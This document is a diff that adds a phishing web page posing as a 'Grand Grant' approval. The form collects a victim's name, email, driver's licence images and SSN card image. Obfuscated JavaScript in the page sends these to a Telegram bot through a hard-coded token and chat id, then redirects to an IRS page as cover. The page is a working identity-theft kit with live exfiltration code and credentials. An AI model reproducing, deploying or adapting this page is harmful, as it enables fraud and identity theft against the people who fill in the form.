@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grand Grant Application Upload</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f8f9fa;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #fff;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+
+    h2, h3 {
+      text-align: center;
+      color: #333;
+    }
+
+    .notice {
+      background: linear-gradient(135deg, #ffdd57, #ff6f61);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      font-size: 1.5em;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"], input[type="email"], input[type="file"], button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background: royalblue;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: darkblue;
+    }
+
+    .info {
+      color: #555;
+      font-size: 0.9em;
+      margin-bottom: 20px;
+    }
+
+    .preview {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .preview img {
+      max-width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .confirmation {
+      color: green;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Notice Section -->
+  <div class="container">
+    <div class="notice">
+      🎉 Exciting News! Your Grand Grant will be paid in the first week of December! 🎉
+    </div>
+  </div>
+
+  <!-- Form Section -->
+  <div class="container hidden" id="formContainer">
+    <h2>Grand Grant Approved Application</h2>
+    <p class="info">* Eligibility Requirement: Minimum credit score of 750 *</p>
+    <form id="grantForm">
+      <div class="form-group">
+        <label for="name">Full Name:</label>
+        <input type="text" id="name" name="name" placeholder="John Doe" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address:</label>
+        <input type="email" id="email" name="email" placeholder="example@domain.com" required>
+      </div>
+      <div class="form-group">
+        <label for="dlFront">Driver's License (Front):</label>
+        <input type="file" id="dlFront" name="dlFront" accept="image/*" required onchange="previewImage('dlFront', 'previewDlFront')">
+        <div id="previewDlFront" class="preview"></div>
+      </div>
+      <div class="form-group">
+        <label for="dlBack">Driver's License (Back):</label>
+        <input type="file" id="dlBack" name="dlBack" accept="image/*" required onchange="previewImage('dlBack', 'previewDlBack')">
+        <div id="previewDlBack" class="preview"></div>
+      </div>
+      <div class="form-group">
+        <label for="ssnFront">SSN Card (Front):</label>
+        <input type="file" id="ssnFront" name="ssnFront" accept="image/*" required onchange="previewImage('ssnFront', 'previewSsnFront')">
+        <div id="previewSsnFront" class="preview"></div>
+      </div>
+      <div class="confirmation" id="confirmation" style="display: none;">
+        Images uploaded successfully! Click Submit to proceed.
+      </div>
+      <button type="button" onclick="submitForm()">Submit Application</button>
+    </form>
+  </div>
+
+  <script>
+   function _0x4b41(){const _0x4bfc4b=['length','\x22\x20alt=\x22Preview\x20Image\x22>','/sendDocument','target','style','get','innerHTML','68KFrmYw','block','confirmation','email','514656klYSgg','readAsDataURL','dlBack','result','<img\x20src=\x22','location','31645270vJFJSJ','46qFqLaK','classList','files','remove','12148794mMwCWs','chat_id','append','Failed\x20to\x20submit\x20the\x20application.\x20Please\x20try\x20again.','https://api.telegram.org/bot','/sendMessage','dlFront','259472moagbK','name','grantForm','\x0a\x20\x20\x20\x20\x20\x20\x20\x20*New\x20Grant\x20Application\x20Submitted*\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20*Name:*\x20','1381343RYweXJ','ssnFront','application/json','getElementById','\x0a\x20\x20\x20\x20\x20\x20','18265rREbOC','https://www.irs.gov/refunds/get-your-refund-faster-tell-irs-to-direct-deposit-your-refund-to-one-two-or-three-accounts','scrollTo','document','266mRORfe','44862ysVfUy','Application\x20submitted\x20successfully!','Markdown','6496660023'];_0x4b41=function(){return _0x4bfc4b;};return _0x4b41();}(function(_0x248883,_0x3bc6bd){const _0xec4240=_0x14ae,_0x55f336=_0x248883();while(!![]){try{const _0xddf2e1=parseInt(_0xec4240(0x146))/0x1+-parseInt(_0xec4240(0x137))/0x2*(-parseInt(_0xec4240(0x150))/0x3)+parseInt(_0xec4240(0x12c))/0x4*(-parseInt(_0xec4240(0x14b))/0x5)+-parseInt(_0xec4240(0x130))/0x6+parseInt(_0xec4240(0x14f))/0x7*(parseInt(_0xec4240(0x142))/0x8)+parseInt(_0xec4240(0x13b))/0x9+-parseInt(_0xec4240(0x136))/0xa;if(_0xddf2e1===_0x3bc6bd)break;else _0x55f336['push'](_0x55f336['shift']());}catch(_0x5a898d){_0x55f336['push'](_0x55f336['shift']());}}}(_0x4b41,0xf2fa7),setTimeout(()=>{const _0x134095=_0x14ae;document[_0x134095(0x149)]('formContainer')[_0x134095(0x138)][_0x134095(0x13a)]('hidden'),window[_0x134095(0x14d)]({'top':0x0,'behavior':'smooth'});},0x7d0));function previewImage(_0x3d55e3,_0x5cb248){const _0x44870f=_0x14ae,_0x2277bc=document[_0x44870f(0x149)](_0x3d55e3),_0x5cc1a5=document[_0x44870f(0x149)](_0x5cb248);if(_0x2277bc['files']&&_0x2277bc[_0x44870f(0x139)][0x0]){const _0xa9d41e=new FileReader();_0xa9d41e['onload']=function(_0x147070){const _0xca3904=_0x44870f;_0x5cc1a5[_0xca3904(0x12b)]=_0xca3904(0x134)+_0x147070[_0xca3904(0x128)][_0xca3904(0x133)]+_0xca3904(0x126);},_0xa9d41e[_0x44870f(0x131)](_0x2277bc[_0x44870f(0x139)][0x0]);}checkUploads();}function _0x14ae(_0x131903,_0x527bc1){const _0x4b410c=_0x4b41();return _0x14ae=function(_0x14aef2,_0x596509){_0x14aef2=_0x14aef2-0x125;let _0x1ab63a=_0x4b410c[_0x14aef2];return _0x1ab63a;},_0x14ae(_0x131903,_0x527bc1);}function checkUploads(){const _0x476e5d=_0x14ae,_0x48b171=document[_0x476e5d(0x149)](_0x476e5d(0x141))[_0x476e5d(0x139)]['length']>0x0,_0x394ba7=document[_0x476e5d(0x149)](_0x476e5d(0x132))[_0x476e5d(0x139)]['length']>0x0,_0x28c70a=document[_0x476e5d(0x149)](_0x476e5d(0x147))[_0x476e5d(0x139)][_0x476e5d(0x125)]>0x0;_0x48b171&&_0x394ba7&&_0x28c70a&&(document[_0x476e5d(0x149)](_0x476e5d(0x12e))[_0x476e5d(0x129)]['display']=_0x476e5d(0x12d));}async function submitForm(){const _0x57922b=_0x14ae,_0x90e90c=document[_0x57922b(0x149)](_0x57922b(0x144)),_0x1c46f5=new FormData(_0x90e90c),_0x4ce4f5='7001993337:AAGpKzgLkXH-P8ofVX2KCkXVSaHLOyQrw_E',_0x2d8512=_0x57922b(0x153),_0x92321e=_0x57922b(0x145)+_0x1c46f5[_0x57922b(0x12a)](_0x57922b(0x143))+'\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20*Email:*\x20'+_0x1c46f5[_0x57922b(0x12a)](_0x57922b(0x12f))+_0x57922b(0x14a);try{await fetch(_0x57922b(0x13f)+_0x4ce4f5+_0x57922b(0x140),{'method':'POST','headers':{'Content-Type':_0x57922b(0x148)},'body':JSON['stringify']({'chat_id':_0x2d8512,'text':_0x92321e,'parse_mode':_0x57922b(0x152)})});for(const _0x261996 of['dlFront',_0x57922b(0x132),'ssnFront']){const _0x38d778=new FormData();_0x38d778[_0x57922b(0x13d)](_0x57922b(0x13c),_0x2d8512),_0x38d778[_0x57922b(0x13d)](_0x57922b(0x14e),_0x1c46f5[_0x57922b(0x12a)](_0x261996)),await fetch(_0x57922b(0x13f)+_0x4ce4f5+_0x57922b(0x127),{'method':'POST','body':_0x38d778});}alert(_0x57922b(0x151)),window[_0x57922b(0x135)]['href']=_0x57922b(0x14c);}catch(_0x31f5c8){alert(_0x57922b(0x13e)),console['error'](_0x31f5c8);}}
+  </script>
+</body>
+</html>
